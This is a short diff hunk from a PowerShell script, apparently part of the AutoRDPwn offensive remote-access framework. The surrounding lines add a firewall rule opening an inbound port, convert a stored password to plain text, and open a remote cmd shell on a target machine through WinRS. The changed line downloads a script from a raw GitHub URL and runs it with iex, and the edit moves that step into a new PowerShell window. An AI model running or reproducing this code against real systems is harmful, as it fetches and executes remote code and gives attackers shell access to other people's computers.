@@ -443,7 +443,7 @@ netsh advfirewall firewall add rule name="Powershell Webserver" dir=in action=al
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue 
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; sleep -milliseconds 4000
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex 2>&1> $null }}
+start powershell { Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex }}}
 
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt29 <<" ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host "" ; Write-Host "$txt30" -ForegroundColor Red ; sleep -milliseconds 3000 }} if($tsfail) { Write-Host "" ; Write-Host "$txt30" -ForegroundColor Red ; sleep -milliseconds 3000 }}
